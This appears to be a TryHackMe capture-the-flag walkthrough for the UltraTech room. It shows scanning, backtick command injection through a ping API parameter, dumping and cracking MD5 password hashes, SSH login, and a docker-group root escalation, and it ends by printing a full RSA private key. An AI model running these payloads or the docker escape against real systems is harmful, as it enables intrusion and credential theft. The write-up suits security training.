
0. First thing first we should do before getting started it's to connect to tryhackme network 

downlod opvn configutation file from here `https://tryhackme.com/access` and than:

`sudo openvpn name.ovpn`

1. Which software is using the port 8081?

So to get with service running in port 8081, we are going to use nmap

`sudo nmap -Pn -sS -sV -sC -p 8081 <target_ip>`

  GNU nano 8.4                                          nscan.txt                                                   
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH 
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
MAC Address: 02:9D:E2:A1:A0:6D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds


Answer:Node.js

2. Which other non-standard port is used?

Answer:31331 ---> you will find it from nmap scan

3. Which software using this port? 

Answer: Apache

4. Which GNU/Linux distribution seems to be used? 

Answer: Ubuntu

5. The software using the port 8081 is a REST api, how many of its routes are used by the web application?
Answer: 2

6. There is a database lying around, what is its filename? 

As we already know that in port 8081 we have api so we can assume that we access to database information

with this port. 

So now we going to look for directories in <target_ip>:8081 

```
$ gobuster dir -u http://10.10.19.14:8081  -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.14:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

here we have `auth` and `ping` directories also here we can assume that auth directory is for login to the

server, and ping to ping the server. 

So lets check it on browser
`http://10.10.19.14:8081/ping?ip=127.0.0.1` 

you should something like this 
 `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms `

it means that this directory connected to the server db, and we can try to command inject it:

http://10.10.19.14:8081/ping?ip=127.0.0.1`ls` ---> wooops! injection works

you will get something like this:
`ping: utech.db.sqlite: Name or service not known`

where `utech.db.sqlite` is our db

You should also investigate directories <target_ip>:31331 --->here could  find some users like `r00t` 

Answer:utech.db.sqlite


7. What is the first user's password hash?

The user's password hash is stored in this Database to see it we use another command injection 

"http://10.10.19.14:8081/ping?ip=127.0.0.1`cat%20utech.db.sqlite`"
 
where `root`-->`f357a0c52799563c7c7b76c1e7543a32`
and   `admin`--->`0d0ea5111e3c1def594c1684e3b9be84`

Answer:f357a0c52799563c7c7b76c1e7543a32

8. What is the password associated with this hash?

now we should crack the hash, to identify what type of hash is it we are going to use hash-identifier:


9. What are the first 9 characters of the root user's private SSH key?
```
$ hash-identifier f357a0c52799563c7c7b76c1e7543a32     

   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```
now we know that it's md5, next step is to crack it with hashcat:


```
$ hashcat -m 0 -a 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f357a0c52799563c7c7b76c1e7543a32:n100906                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: f357a0c52799563c7c7b76c1e7543a32
Time.Started.....: Sat Jul  5 03:34:29 2025 (1 sec)
Time.Estimated...: Sat Jul  5 03:34:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 10960.7 kH/s (2.02ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5373952/14344385 (37.46%)
Rejected.........: 0/5373952 (0.00%)
Restore.Point....: 5242880/14344385 (36.55%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: n1ckos -> morrison_22
Hardware.Mon.#1..: Temp: 66c Util: 44% Core:1518MHz Mem:3003MHz Bus:16

```
in hashcat `-m` means to identify hashtype so `0` is `md5` to get what number is your hashtype you can simply use `man hashcat` and find it. 

Answer:n100906

9.

```
$ ssh r00t@10.10.19.14
The authenticity of host '10.10.19.14 (10.10.19.14)' can't be established.
ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.19.14' (ECDSA) to the list of known hosts.
r00t@10.10.19.14's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct  7 14:38:02 UTC 2020

  System load:  0.03               Processes:           101
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 74%                IP address for eth0: 10.10.19.14
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ ls
r00t@ultratech-prod:~$ ls -la
total 28
drwxr-xr-x 4 r00t r00t 4096 Oct  7 14:38 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Oct  7 14:38 .cache
drwx------ 3 r00t r00t 4096 Oct  7 14:38 .gnupg
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
^C
r00t@ultratech-prod:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
r00t@ultratech-prod:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s…"   18 months ago       Exited (130) 18 months ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   18 months ago       Exited (127) 18 months ago                       boring_volhard
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami  
root
# /bin/bash
root@ad624c3147a8:~# ls -a
.  ..  .bash_history  .bashrc  .cache  .emacs.d  .gnupg  .profile  .python_history  .ssh  private.txt
root@ad624c3147a8:~# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```
Answer: MIIEogIBA
